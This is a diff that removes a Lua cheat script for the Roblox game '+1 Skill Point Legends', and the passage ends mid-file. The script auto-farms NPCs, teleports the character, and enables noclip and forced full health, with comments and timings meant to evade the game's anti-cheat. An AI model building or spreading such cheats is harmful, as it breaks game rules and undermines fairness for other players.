@@ -1,1036 +1,647 @@
--- +1 Skill Point Legends Auto-Farm
--- Aurora v2 UI | by notCitruss | +1 SPL v2
--- Tank Pink theme | Frame-based inputs (anti-cheat safe)
--- All interactive elements use Active=true + InputBegan (NO TextButtons)
--- All sizing uses UDim2.fromOffset (NO Scale-based sizes)
-
-local Players         = game:GetService("Players")
-local RS              = game:GetService("ReplicatedStorage")
-local RunService      = game:GetService("RunService")
-local TweenService    = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local VirtualUser     = game:GetService("VirtualUser")
-
-local Player    = Players.LocalPlayer
-local Mouse     = Player:GetMouse()
-
-local Interactions = require(RS.Source.Packets.Interactions)
-local fusion       = require(RS.Packages.fusion)
-local Values       = require(RS.Source.Utils.Values)
-local fus          = fusion
-
--- ─── CONFIG ──────────────────────────────────────────────────────────────────
-
-local CFG = {
-    AutoFarm      = false,
-    TeleportToNPC = false,
-    AntiAFK       = false,
-    AutoDaily     = false,
-    AutoStat      = false,
-    Noclip        = false,
-    AutoHeal      = false,
-    AutoChest     = false,
-    AutoPotion    = false,
-    AttackSpeed   = 0.3,
-    TargetMobs    = {},
-    StatTarget    = "Physical Damage",
-}
-
--- ─── CONSTANTS ────────────────────────────────────────────────────────────────
-
-local PINK       = Color3.fromRGB(252, 110, 142)
-local WHITE      = Color3.fromRGB(245, 245, 248)
-local PANEL_BG   = Color3.fromRGB(255, 255, 255)
-local SECTION_BG = Color3.fromRGB(240, 240, 246)
-local TEXT_DARK  = Color3.fromRGB(22, 22, 28)
-local TEXT_MID   = Color3.fromRGB(105, 105, 118)
-local BORDER     = Color3.fromRGB(218, 218, 228)
-local GREEN      = Color3.fromRGB(72, 199, 116)
-local OFF_GRAY   = Color3.fromRGB(178, 178, 190)
-
-local STAT_NAMES = {
-    "Physical Damage",
-    "Magic Damage",
-    "Health",
-    "Regeneration",
-    "Speed",
-    "Jump Power",
-}
-
-local MOB_LIST = {
-    "Any","Snail","Pig","Turtle","Caveman","Spider","Mammoth","Viperbloom",
-    "Warlock","Spartan","Chief","Reaper","Dino","Angel","Arachinex","Cowboy",
-    "Grimroot","Leonidas","Ghost","Totem Sentinel","Mummy","Lightning God",
-    "Blightleap","Bonepicker","Sand Golem","Oculon","Magmaton","Hydra Worm",
-    "Knobble","Dragon","Puffcap","Nevermore","Minotaur","Simba","Winxy",
-    "Anubis","Shellthorn","Ashgor","Eyegor","Bloodroot Witch","Queen of Serpents",
-}
-
-local NPC_SPAWN_POS = {
-    Snail              = Vector3.new(502, 8, 539),
-    Pig                = Vector3.new(767, 5, 220),
-    Turtle             = Vector3.new(897, 4, -101),
-    Caveman            = Vector3.new(497, 5, -449),
-    Spider             = Vector3.new(911, 5, 609),
-    Mammoth            = Vector3.new(1244, 6, 301),
-    Chief              = Vector3.new(350, 8, 490),
-    Dino               = Vector3.new(1294, 6, 642),
-    Arachinex          = Vector3.new(1386, 6, -51),
-    Ashgor             = Vector3.new(1100, 6, 300),
-    Viperbloom         = Vector3.new(885, 6, -468),
-    Warlock            = Vector3.new(1972, 14, -710),
-    Spartan            = Vector3.new(2097, 191, -665),
-    Grimroot           = Vector3.new(1277, 18, -611),
-    Leonidas           = Vector3.new(2750, 83, -660),
-    Reaper             = Vector3.new(889, 384, -1611),
-    Angel              = Vector3.new(525, 384, -1891),
-    ["Lightning God"]  = Vector3.new(616, 407, -2165),
-    Cowboy             = Vector3.new(782, 40, -3365),
-    Ghost              = Vector3.new(278, 40, -3169),
-    ["Totem Sentinel"] = Vector3.new(380, 40, -3476),
-    Mummy              = Vector3.new(684, 40, -3789),
-    ["Sand Golem"]     = Vector3.new(600, 40, -3600),
-    ["Hydra Worm"]     = Vector3.new(603, 40, -3465),
-    Dragon             = Vector3.new(649, 320, -3575),
-    Blightleap         = Vector3.new(1320, -433, -3057),
-    Bonepicker         = Vector3.new(1320, -433, -3200),
-    Oculon             = Vector3.new(1400, -433, -3100),
-    Magmaton           = Vector3.new(1200, -433, -3300),
-    Simba              = Vector3.new(1320, -433, -3400),
-    Nevermore          = Vector3.new(1500, -433, -3100),
-    Anubis             = Vector3.new(1320, -433, -3500),
-}
-
--- NPC zone map
-local NPC_ZONE_MAP = {}
-pcall(function()
-    local NpcTable = require(RS.Source.Utils.NpcTable)
-    for k, v in NpcTable do
-        if type(v) == "table" and v.zone then
-            NPC_ZONE_MAP[k] = v.zone
-        end
-    end
-end)
-
--- ─── STATE ────────────────────────────────────────────────────────────────────
-
-local _running   = false
-local _stopFlag  = false
-local _thread    = nil
-local _kills     = 0
-local _spGained  = 0
-local _spStart   = 0
-local _lastNPC   = "None"
-
--- ─── HELPER FUNCTIONS ────────────────────────────────────────────────────────
-
-local function getHRP()
-    local char = Player.Character
-    if not char then return nil end
-    return char:FindFirstChild("HumanoidRootPart")
-end
-
-local function formatNum(n: number): string
-    if type(n) ~= "number" then return tostring(n) end
-    if n >= 1e6 then return string.format("%.1fM", n / 1e6)
-    elseif n >= 1e3 then return string.format("%.1fK", n / 1e3)
-    else return tostring(math.floor(n)) end
-end
-
-local function getWeaponModule()
-    local weaponName = "Punch"
-    pcall(function()
-        local inv = fus.peek(Values.inventory)
-        local equipped = fus.peek(Values.equippedItems)
-        if equipped and equipped.Weapon and inv[equipped.Weapon] then
-            weaponName = inv[equipped.Weapon].n or "Punch"
-        end
-    end)
-    local mod = RS.Source.Weapons:FindFirstChild(weaponName) or RS.Source.Weapons:FindFirstChild("Punch")
-    if mod then
-        local ok, result = pcall(require, mod)
-        return ok and result or nil, weaponName
-    end
-    return nil, weaponName
-end
-
-local function getNpcName(npc): string
-    for _, desc in npc:GetDescendants() do
-        if desc:IsA("TextLabel") and desc.Text ~= "" and not desc.Text:find("/") then
-            return desc.Text
-        end
-    end
-    return nil
-end
-
-local function findNearestNPC()
-    local hrp = getHRP()
-    if not hrp then return nil end
-    local npcsFolder = workspace:FindFirstChild("Npcs")
-    if not npcsFolder then return nil end
-    local best, bestDist, bestName = nil, math.huge, nil
-    local hasFilter = next(CFG.TargetMobs) ~= nil
-    for _, npc in npcsFolder:GetChildren() do
-        if npc:IsA("Model") and not npc:GetAttribute("Dead") then
-            local npcHrp = npc:FindFirstChild("HumanoidRootPart")
-            if npcHrp then
-                if hasFilter then
-                    local name = getNpcName(npc)
-                    local matched = false
-                    if name then
-                        for mob, _ in pairs(CFG.TargetMobs) do
-                            if name == mob or name:find(mob) then matched = true; break end
-                        end
-                    end
-                    if not matched then continue end
-                end
-                local d = (npcHrp.Position - hrp.Position).Magnitude
-                if d < bestDist then
-                    best = npc; bestDist = d; bestName = getNpcName(npc) or npc.Name
-                end
-            end
-        end
-    end
-    return best, bestDist, bestName
-end
-
-local _lastTP = 0
-local TP_COOLDOWN = 1.5 -- seconds between teleports to avoid anti-cheat kicks
-
-local function tpToNPC(npc)
-    if not npc then return end
-    if tick() - _lastTP < TP_COOLDOWN then return end
-    local hrp  = getHRP()
-    local root = npc:FindFirstChild("HumanoidRootPart") or npc:FindFirstChild("Root")
-    if hrp and root then
-        hrp.CFrame = root.CFrame + Vector3.new(4, 0, 0)
-        _lastTP = tick()
-    end
-end
-
-local function teleportToMobArea(mobName: string)
-    if tick() - _lastTP < TP_COOLDOWN then task.wait(TP_COOLDOWN) end
-    if NPC_SPAWN_POS[mobName] then
-        local hrp = getHRP()
-        if hrp then
-            hrp.CFrame = CFrame.new(NPC_SPAWN_POS[mobName])
-            _lastTP = tick()
-            return
-        end
-    end
-    local zone = NPC_ZONE_MAP[mobName]
-    if zone then
-        pcall(function()
-            Interactions.teleportRequest.send(zone)
-        end)
-        _lastTP = tick()
-    end
-end
-
--- ─── FARM LOOP ───────────────────────────────────────────────────────────────
-
-local function startFarm()
-    if _running then return end
-    _running  = true
-    _stopFlag = false
-    pcall(function()
-        local ls = Player:FindFirstChild("leaderstats")
-        if ls and ls:FindFirstChild("SP") then
-            _spStart = ls.SP.Value
-        end
-    end)
-    _thread = task.spawn(function()
-        local lastDaily = 0
-        while not _stopFlag do
-            local ok, err = pcall(function()
-                local hrp = getHRP()
-                if not hrp then task.wait(2) return end
-                local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
-                if not hum or hum.Health <= 0 then task.wait(2) return end
-
-                if CFG.AutoDaily and tick() - lastDaily > 60 then
-                    pcall(function() Interactions.claimDailyReward.send() end)
-                    pcall(function() Interactions.claimLikeReward.send() end)
-                    lastDaily = tick()
-                end
-
-                local npc, dist, npcName = findNearestNPC()
-
-                -- No target: cycle through selected mobs and TP to their areas
-                if not npc and CFG.TeleportToNPC and next(CFG.TargetMobs) then
-                    -- First check all loaded NPCs
-                    local npcsFolder = workspace:FindFirstChild("Npcs")
-                    if npcsFolder then
-                        for _, n in npcsFolder:GetChildren() do
-                            if n:IsA("Model") and not n:GetAttribute("Dead") then
-                                local nHrp = n:FindFirstChild("HumanoidRootPart")
-                                if nHrp then
-                                    local nm = getNpcName(n)
-                                    if nm then
-                                        for mob, _ in pairs(CFG.TargetMobs) do
-                                            if nm == mob or nm:find(mob) then
-                                                if tick() - _lastTP >= TP_COOLDOWN then
-                                                    hrp.CFrame = CFrame.new(nHrp.Position + Vector3.new(0, 3, -4), nHrp.Position)
-                                                    _lastTP = tick()
-                                                end
-                                                task.wait(1)
-                                                npc = n; npcName = nm
-                                                break
-                                            end
-                                        end
-                                    end
-                                    if npc then break end
-                                end
-                            end
-                        end
-                    end
-                    -- Still no NPC: cycle through each selected mob and TP to spawn area
-                    if not npc then
-                        for mob, _ in pairs(CFG.TargetMobs) do
-                            if _stopFlag then break end
-                            _lastNPC = "Searching " .. mob .. "..."
-                            teleportToMobArea(mob)
-                            task.wait(3) -- longer wait to avoid anti-cheat detection
-                            if _stopFlag then break end
-                            npc, dist, npcName = findNearestNPC()
-                            if npc then break end
-                        end
-                    end
-                end
-
-                if not npc then return end
-                _lastNPC = npcName or npc.Name
-
-                -- TP to NPC if far
-                if CFG.TeleportToNPC and (dist or 999) > 25 then
-                    tpToNPC(npc)
-                    task.wait(0.15)
-                end
-
-                -- Attack
-                pcall(function()
-                    local weapon = getWeaponModule()
-                    if weapon and weapon.onActivated then
-                        weapon.onActivated(Mouse)
-                    end
-                end)
-
-                -- Track kills
-                if npc:GetAttribute("Dead") then _kills += 1 end
-
-                -- Track SP
-                pcall(function()
-                    local ls = Player:FindFirstChild("leaderstats")
-                    if ls and ls:FindFirstChild("SP") then
-                        _spGained = ls.SP.Value - _spStart
-                    end
-                end)
-            end)
-            if not ok then warn("[SPL] Farm error:", err) end
-            task.wait(CFG.AttackSpeed)
-        end
-        _running = false
-    end)
-end
-
-local function stopFarm()
-    _stopFlag = true
-    if _thread then
-        pcall(task.cancel, _thread)
-        _thread = nil
-    end
-    _running = false
-end
-
--- ─── ANTI-AFK LOOP ───────────────────────────────────────────────────────────
-
-task.spawn(function()
-    while true do
-        if CFG.AntiAFK then
-            pcall(function() VirtualUser:CaptureController() end)
-            pcall(function() VirtualUser:ClickButton2(Vector2.new()) end)
-        end
-        task.wait(30)
-    end
-end)
-
--- ─── AUTO STAT LOOP ──────────────────────────────────────────────────────────
-
-task.spawn(function()
-    while true do
-        if CFG.AutoStat then
-            pcall(function()
-                local currentSP = fus.peek(Values.skillPoints)
-                if currentSP and currentSP >= 3 then
-                    local amount = math.min(currentSP, math.max(3, math.floor(currentSP * 0.5)))
-                    Interactions.statUpdateRequest.send({ stat = CFG.StatTarget, amount = amount })
-                end
-            end)
-        end
-        task.wait(2)
-    end
-end)
-
--- ─── AUTO CHEST LOOP ─────────────────────────────────────────────────────────
-
-task.spawn(function()
-    while true do
-        if CFG.AutoChest then
-            pcall(function() Interactions.chestOpenRequest.send() end)
-        end
-        task.wait(5)
-    end
-end)
-
--- ─── AUTO POTION LOOP ────────────────────────────────────────────────────────
-
-task.spawn(function()
-    while true do
-        if CFG.AutoPotion then
-            pcall(function() Interactions.potionUseRequest.send() end)
-        end
-        task.wait(10)
-    end
-end)
-
--- ─── NOCLIP + AUTO HEAL (RunService.Stepped) ─────────────────────────────────
-
-RunService.Stepped:Connect(function()
-    local char = Player.Character
-    if not char then return end
-    if CFG.Noclip then
-        for _, p in char:GetDescendants() do
-            if p:IsA("BasePart") then
-                p.CanCollide = false
-            end
-        end
-    end
-    if CFG.AutoHeal then
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        if hum then hum.Health = hum.MaxHealth end
-    end
-end)
-
--- Hook HealthChanged for instant heal
-local function hookHeal(char)
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then
-        hum = char:WaitForChild("Humanoid", 5)
-    end
-    if hum then
-        hum.HealthChanged:Connect(function()
-            if CFG.AutoHeal and hum.Health < hum.MaxHealth then
-                hum.Health = hum.MaxHealth
-            end
-        end)
-    end
-end
-Player.CharacterAdded:Connect(hookHeal)
-if Player.Character then
-    pcall(hookHeal, Player.Character)
-end
-
--- ─── UI FACTORY HELPERS ──────────────────────────────────────────────────────
-
-local function corner(inst, r)
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(0, r or 6)
-    c.Parent = inst
-end
-
-local function listLayout(inst, dir, gap, ha, va)
-    local l = Instance.new("UIListLayout")
-    l.FillDirection       = dir or Enum.FillDirection.Vertical
-    l.SortOrder           = Enum.SortOrder.LayoutOrder
-    l.Padding             = UDim.new(0, gap or 4)
-    l.HorizontalAlignment = ha or Enum.HorizontalAlignment.Left
-    l.VerticalAlignment   = va or Enum.VerticalAlignment.Top
-    l.Parent = inst
-    return l
-end
-
-local function frame(p, bg, sz, pos, z, clips)
-    local f = Instance.new("Frame")
-    f.BackgroundColor3 = bg or WHITE
-    f.BorderSizePixel  = 0
-    f.Size             = sz or UDim2.fromOffset(100, 30)
-    f.Position         = pos or UDim2.fromOffset(0, 0)
-    f.ZIndex           = z or 1
-    f.ClipsDescendants = clips or false
-    f.Parent           = p
-    return f
-end
-
-local function label(p, text, sz, pos, tc, ts, font, xa, z)
-    local l = Instance.new("TextLabel")
-    l.BackgroundTransparency = 1
-    l.Size             = sz or UDim2.fromOffset(100, 20)
-    l.Position         = pos or UDim2.fromOffset(0, 0)
-    l.Text             = text or ""
-    l.TextColor3       = tc or TEXT_DARK
-    l.Font             = font or Enum.Font.GothamMedium
-    l.TextSize         = ts or 12
-    l.TextXAlignment   = xa or Enum.TextXAlignment.Left
-    l.TextYAlignment   = Enum.TextYAlignment.Center
-    l.TextTruncate     = Enum.TextTruncate.AtEnd
-    l.ZIndex           = z or 2
-    l.Parent           = p
-    return l
-end
-
--- Frame-based hitbox overlay (anti-cheat safe click handler)
-local function hitbox(p, w, h, z, fn)
-    local h2 = frame(p, Color3.new(0, 0, 0), UDim2.fromOffset(w, h), UDim2.fromOffset(0, 0), z or 20)
-    h2.BackgroundTransparency = 1
-    h2.Active = true
-    h2.InputBegan:Connect(function(inp)
-        if inp.UserInputType == Enum.UserInputType.MouseButton1
-        or inp.UserInputType == Enum.UserInputType.Touch then
-            fn()
-        end
-    end)
-    return h2
-end
-
-local TI_FAST = TweenInfo.new(0.14, Enum.EasingStyle.Quad)
-
--- Toggle row: returns (row, getState, setState)
-local function makeToggle(parent, labelText, cfgKey, z, onChanged)
-    local Z = z or 12
-    local row = frame(parent, Color3.fromRGB(250, 250, 253), UDim2.fromOffset(280, 30), nil, Z)
-    corner(row, 6)
-    label(row, labelText, UDim2.fromOffset(205, 30), UDim2.fromOffset(10, 0), TEXT_DARK, 12, Enum.Font.GothamMedium, Enum.TextXAlignment.Left, Z + 1)
-    local track = frame(row, OFF_GRAY, UDim2.fromOffset(36, 18), UDim2.fromOffset(234, 6), Z + 1)
-    corner(track, 9)
-    local knob = frame(track, WHITE, UDim2.fromOffset(14, 14), UDim2.fromOffset(2, 2), Z + 2)
-    corner(knob, 7)
-
-    local state = CFG[cfgKey] or false
-
-    local function setState(val)
-        state = val
-        if cfgKey then CFG[cfgKey] = val end
-        TweenService:Create(track, TI_FAST, { BackgroundColor3 = val and PINK or OFF_GRAY }):Play()
-        TweenService:Create(knob,  TI_FAST, { Position = val and UDim2.fromOffset(20, 2) or UDim2.fromOffset(2, 2) }):Play()
-        if onChanged then onChanged(val) end
-    end
-
-    hitbox(row, 280, 30, Z + 3, function() setState(not state) end)
-    return row, function() return state end, setState
-end
-
--- Pink action button (Frame-based)
-local function makeBtn(parent, text, w, h, z, fn)
-    local Z = z or 12
-    local btn = frame(parent, PINK, UDim2.fromOffset(w or 120, h or 26), nil, Z)
-    corner(btn, 6)
-    label(btn, text, UDim2.fromOffset(w or 120, h or 26), UDim2.fromOffset(0, 0), WHITE, 11, Enum.Font.GothamBold, Enum.TextXAlignment.Center, Z + 1)
-    hitbox(btn, w or 120, h or 26, Z + 2, function()
-        TweenService:Create(btn, TI_FAST, { BackgroundColor3 = Color3.fromRGB(218, 78, 112) }):Play()
-        task.delay(0.12, function()
-            if btn and btn.Parent then
-                TweenService:Create(btn, TI_FAST, { BackgroundColor3 = PINK }):Play()
-            end
-        end)
-        if fn then fn() end
-    end)
-    return btn
-end
-
--- Section header
-local function sectionHeader(parent, text, z)
-    local Z = z or 12
-    local hdr = frame(parent, SECTION_BG, UDim2.fromOffset(280, 22), nil, Z)
-    corner(hdr, 4)
-    label(hdr, "  " .. text, UDim2.fromOffset(280, 22), UDim2.fromOffset(0, 0), PINK, 10, Enum.Font.GothamBold, Enum.TextXAlignment.Left, Z + 1)
-    return hdr
-end
-
--- Right panel stat row: returns (row, valueLbl)
-local function statRow(parent, lText, initVal, z)
-    local Z = z or 12
-    local row = frame(parent, Color3.fromRGB(252, 252, 255), UDim2.fromOffset(196, 26), nil, Z)
-    corner(row, 5)
-    label(row, lText, UDim2.fromOffset(108, 26), UDim2.fromOffset(8, 0), TEXT_MID, 10, Enum.Font.GothamMedium, Enum.TextXAlignment.Left, Z + 1)
-    local val = label(row, initVal or "--", UDim2.fromOffset(76, 26), UDim2.fromOffset(112, 0), TEXT_DARK, 10, Enum.Font.GothamBold, Enum.TextXAlignment.Right, Z + 1)
-    return row, val
-end
-
--- Right panel section header
-local function rightHeader(parent, text, z)
-    local Z = z or 12
-    local hdr = frame(parent, SECTION_BG, UDim2.fromOffset(196, 20), nil, Z)
-    corner(hdr, 4)
-    label(hdr, "  " .. text, UDim2.fromOffset(196, 20), UDim2.fromOffset(0, 0), PINK, 9, Enum.Font.GothamBold, Enum.TextXAlignment.Left, Z + 1)
-    return hdr
-end
-
--- Transparent spacer
-local function spacer(parent, w, h, z)
-    local s = frame(parent, Color3.new(), UDim2.fromOffset(w, h), nil, z or 2)
-    s.BackgroundTransparency = 1
-    return s
-end
-
--- ─── BUILD GUI ────────────────────────────────────────────────────────────────
-
-local existing = Player.PlayerGui:FindFirstChild("AuroraSPL")
-if existing then existing:Destroy() end
-
-local gui = Instance.new("ScreenGui")
-gui.Name           = "AuroraSPL"
-gui.ResetOnSpawn   = false
-gui.DisplayOrder   = 50
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.Parent         = Player.PlayerGui
-
--- ─── MAIN FRAME ──────────────────────────────────────────────────────────────
-
-local MAIN_W = 556
-local MAIN_H = 524
-local TITLE_H = 44
-local STATUS_H = 28
-local CONTENT_Y = TITLE_H + STATUS_H + 1  -- 73
-
-local main = frame(gui, PANEL_BG, UDim2.fromOffset(MAIN_W, MAIN_H), UDim2.fromOffset(60, 80), 10, false)
-corner(main, 10)
-
--- Drop shadow
-do
-    local sh = frame(main, Color3.new(), UDim2.fromOffset(MAIN_W + 12, MAIN_H + 12), UDim2.fromOffset(-6, 5), 9)
-    sh.BackgroundTransparency = 0.84
-    corner(sh, 12)
-end
-
--- ─── TITLE BAR ───────────────────────────────────────────────────────────────
-
-local titleBar = frame(main, PINK, UDim2.fromOffset(MAIN_W, TITLE_H), UDim2.fromOffset(0, 0), 11)
-corner(titleBar, 10)
--- patch bottom rounded corners of title bar
-do
-    local fix = frame(main, PINK, UDim2.fromOffset(MAIN_W, 10), UDim2.fromOffset(0, TITLE_H - 2), 11)
-end
-
-label(titleBar, "🌸", UDim2.fromOffset(34, TITLE_H), UDim2.fromOffset(10, 0), WHITE, 18, Enum.Font.GothamBold, Enum.TextXAlignment.Left, 12)
-label(titleBar, "+1 Skill Point Legends", UDim2.fromOffset(340, 24), UDim2.fromOffset(46, 2), WHITE, 14, Enum.Font.GothamBold, Enum.TextXAlignment.Left, 12)
-label(titleBar, "by notCitruss  —  +1 SPL v2", UDim2.fromOffset(340, 18), UDim2.fromOffset(46, 24), Color3.fromRGB(255, 215, 228), 10, Enum.Font.GothamMedium, Enum.TextXAlignment.Left, 12)
-
--- Minimize button
-local minFrame = frame(titleBar, Color3.fromRGB(255, 255, 255), UDim2.fromOffset(24, 24), UDim2.fromOffset(MAIN_W - 62, 10), 13)
-minFrame.BackgroundTransparency = 0.3
-corner(minFrame, 6)
-local minLbl = label(minFrame, "—", UDim2.fromOffset(24, 24), UDim2.fromOffset(0, 0), WHITE, 12, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 14)
-
--- Close button
-local closeFrame = frame(titleBar, Color3.fromRGB(255, 255, 255), UDim2.fromOffset(24, 24), UDim2.fromOffset(MAIN_W - 34, 10), 13)
-closeFrame.BackgroundTransparency = 0.3
-corner(closeFrame, 6)
-label(closeFrame, "x", UDim2.fromOffset(24, 24), UDim2.fromOffset(0, 0), WHITE, 12, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 14)
-
--- ─── STATUS BAR ──────────────────────────────────────────────────────────────
-
-local statusBar = frame(main, Color3.fromRGB(248, 248, 252), UDim2.fromOffset(MAIN_W, STATUS_H), UDim2.fromOffset(0, TITLE_H), 11)
-local statusDot = frame(statusBar, OFF_GRAY, UDim2.fromOffset(8, 8), UDim2.fromOffset(12, 10), 12)
-corner(statusDot, 4)
-local statusLbl = label(statusBar, "Idle  |  SP: --  |  Kills: 0", UDim2.fromOffset(524, STATUS_H), UDim2.fromOffset(26, 0), TEXT_MID, 10, Enum.Font.GothamMedium, Enum.TextXAlignment.Left, 12)
--- 1px separator
-frame(main, BORDER, UDim2.fromOffset(MAIN_W, 1), UDim2.fromOffset(0, TITLE_H + STATUS_H), 11)
-
--- ─── LEFT PANEL ──────────────────────────────────────────────────────────────
-
-local LEFT_W   = 308
-local SCROLL_H = MAIN_H - CONTENT_Y - 8
-
-local leftScroll = Instance.new("ScrollingFrame")
-leftScroll.BackgroundTransparency = 1
-leftScroll.Size                   = UDim2.fromOffset(LEFT_W, SCROLL_H)
-leftScroll.Position               = UDim2.fromOffset(8, CONTENT_Y + 4)
-leftScroll.CanvasSize             = UDim2.fromOffset(0, 0)
-leftScroll.ScrollBarThickness     = 3
-leftScroll.ScrollBarImageColor3   = PINK
-leftScroll.AutomaticCanvasSize    = Enum.AutomaticSize.Y
-leftScroll.ZIndex                 = 11
-leftScroll.Parent                 = main
-
-local leftC = frame(leftScroll, Color3.new(), UDim2.fromOffset(LEFT_W - 6, 10), nil, 12)
-leftC.BackgroundTransparency = 1
-local leftList = listLayout(leftC, Enum.FillDirection.Vertical, 5)
-
--- Add to left panel
-local function L(inst)
-    inst.Parent = leftC
-end
-
--- ── FARMING ──────────────────────────────────────────────────────────────────
-
-L(sectionHeader(nil, "FARMING", 12))
-local farmRow = makeToggle(nil, "Auto Farm", "AutoFarm", 12, function(val)
-    if val then startFarm() else stopFarm() end
-end)
-L(farmRow)
-L(makeToggle(nil, "Teleport to NPCs", "TeleportToNPC", 12))
-
--- ── TARGET MOB ───────────────────────────────────────────────────────────────
-
-L(sectionHeader(nil, "TARGET MOB", 12))
-
--- Dropdown toggle row
-local dropToggleRow = frame(nil, SECTION_BG, UDim2.fromOffset(280, 30), nil, 12)
-corner(dropToggleRow, 6)
-local mobDropLbl = label(dropToggleRow, "Select Mobs  (all)", UDim2.fromOffset(240, 30), UDim2.fromOffset(10, 0), TEXT_DARK, 11, Enum.Font.GothamMedium, Enum.TextXAlignment.Left, 13)
-label(dropToggleRow, "v", UDim2.fromOffset(28, 30), UDim2.fromOffset(248, 0), PINK, 11, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 13)
-L(dropToggleRow)
-
-local function updateMobLabel()
-    local n = 0
-    for _ in pairs(CFG.TargetMobs) do n += 1 end
-    mobDropLbl.Text = n == 0 and "Select Mobs  (all)" or ("Select Mobs  (" .. n .. " selected)")
-end
-
--- Dropdown panel parented to main (high ZIndex so it overlays all panels)
-local dropOpen  = false
-local dropPanel = frame(main, WHITE, UDim2.fromOffset(280, 200), UDim2.fromOffset(16, 200), 50, true)
-corner(dropPanel, 8)
-dropPanel.Visible = false
-
--- Shadow under dropdown
-do
-    local sh = frame(dropPanel, Color3.new(), UDim2.fromOffset(290, 210), UDim2.fromOffset(-5, 3), 49)
-    sh.BackgroundTransparency = 0.82
-    corner(sh, 10)
-end
-
-local dropScroll = Instance.new("ScrollingFrame")
-dropScroll.BackgroundTransparency = 1
-dropScroll.Size                   = UDim2.fromOffset(280, 200)
-dropScroll.CanvasSize             = UDim2.fromOffset(0, 0)
-dropScroll.ScrollBarThickness     = 3
-dropScroll.ScrollBarImageColor3   = PINK
-dropScroll.AutomaticCanvasSize    = Enum.AutomaticSize.Y
-dropScroll.ZIndex                 = 51
-dropScroll.Parent                 = dropPanel
-
-listLayout(dropScroll, Enum.FillDirection.Vertical, 2, Enum.HorizontalAlignment.Left)
-
-do
-    local pad = Instance.new("UIPadding")
-    pad.PaddingTop    = UDim.new(0, 4)
-    pad.PaddingLeft   = UDim.new(0, 4)
-    pad.PaddingRight  = UDim.new(0, 4)
-    pad.PaddingBottom = UDim.new(0, 4)
-    pad.Parent        = dropScroll
-end
-
-local mobCheckState = {}
-for _, mob in MOB_LIST do
-    mobCheckState[mob] = false
-end
-
-for _, mob in MOB_LIST do
-    local row = frame(dropScroll, Color3.fromRGB(252, 252, 255), UDim2.fromOffset(262, 24), nil, 52)
-    corner(row, 4)
-    local chk = frame(row, OFF_GRAY, UDim2.fromOffset(14, 14), UDim2.fromOffset(6, 5), 53)
-    corner(chk, 3)
-    label(row, mob, UDim2.fromOffset(232, 24), UDim2.fromOffset(26, 0), TEXT_DARK, 11, Enum.Font.GothamMedium, Enum.TextXAlignment.Left, 53)
-    hitbox(row, 262, 24, 54, function()
-        mobCheckState[mob] = not mobCheckState[mob]
-        chk.BackgroundColor3 = mobCheckState[mob] and PINK or OFF_GRAY
-        CFG.TargetMobs = {}
-        for m, sel in mobCheckState do
-            if sel then CFG.TargetMobs[m] = true end
-        end
-        updateMobLabel()
-    end)
-end
-
--- Toggle dropdown open/close
-hitbox(dropToggleRow, 280, 30, 14, function()
-    dropOpen = not dropOpen
-    dropPanel.Visible = dropOpen
-    if dropOpen then
-        local rowAbs  = dropToggleRow.AbsolutePosition
-        local mainAbs = main.AbsolutePosition
-        dropPanel.Position = UDim2.fromOffset(
-            rowAbs.X - mainAbs.X,
-            rowAbs.Y - mainAbs.Y + 32
-        )
-    end
-end)
-
--- Close dropdown on outside click
-UserInputService.InputBegan:Connect(function(inp)
-    if inp.UserInputType ~= Enum.UserInputType.MouseButton1
-    and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-    if not dropOpen then return end
-    local pos     = inp.Position
-    local dpAbs   = dropPanel.AbsolutePosition
-    local dpSz    = dropPanel.AbsoluteSize
-    local rowAbs  = dropToggleRow.AbsolutePosition
-    local rowSz   = dropToggleRow.AbsoluteSize
-    local inDrop  = pos.X >= dpAbs.X  and pos.X <= dpAbs.X  + dpSz.X  and pos.Y >= dpAbs.Y  and pos.Y <= dpAbs.Y  + dpSz.Y
-    local inRow   = pos.X >= rowAbs.X and pos.X <= rowAbs.X + rowSz.X and pos.Y >= rowAbs.Y and pos.Y <= rowAbs.Y + rowSz.Y
-    if not inDrop and not inRow then
-        dropOpen = false
-        dropPanel.Visible = false
-    end
-end)
-
--- ── STATS & SPEED ────────────────────────────────────────────────────────────
-
-L(sectionHeader(nil, "STATS & SPEED", 12))
-L(makeToggle(nil, "Auto Add Stats", "AutoStat", 12))
-
--- Stat target row
-local statRowF = frame(nil, SECTION_BG, UDim2.fromOffset(280, 30), nil, 12)
-corner(statRowF, 6)
-L(statRowF)
-label(statRowF, "Stat Target", UDim2.fromOffset(100, 30), UDim2.fromOffset(10, 0), TEXT_MID, 11, Enum.Font.GothamMedium, Enum.TextXAlignment.Left, 13)
-local statValLbl = label(statRowF, CFG.StatTarget, UDim2.fromOffset(120, 30), UDim2.fromOffset(108, 0), PINK, 10, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 13)
-
-local cycleF = frame(statRowF, PINK, UDim2.fromOffset(28, 20), UDim2.fromOffset(248, 5), 13)
-corner(cycleF, 5)
-label(cycleF, ">", UDim2.fromOffset(28, 20), UDim2.fromOffset(0, 0), WHITE, 10, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 14)
-local statIdx = 1
-hitbox(cycleF, 28, 20, 15, function()
-    statIdx = statIdx % #STAT_NAMES + 1
-    CFG.StatTarget = STAT_NAMES[statIdx]
-    statValLbl.Text = CFG.StatTarget
-end)
-
--- Attack Speed row
-local atkRowF = frame(nil, SECTION_BG, UDim2.fromOffset(280, 30), nil, 12)
-corner(atkRowF, 6)
-L(atkRowF)
-label(atkRowF, "Attack Speed", UDim2.fromOffset(100, 30), UDim2.fromOffset(10, 0), TEXT_MID, 11, Enum.Font.GothamMedium, Enum.TextXAlignment.Left, 13)
-local atkLbl = label(atkRowF, CFG.AttackSpeed .. "s", UDim2.fromOffset(70, 30), UDim2.fromOffset(108, 0), TEXT_DARK, 11, Enum.Font.GothamBold, Enum.TextXAlignment.Center, 13)
-
--- minus button
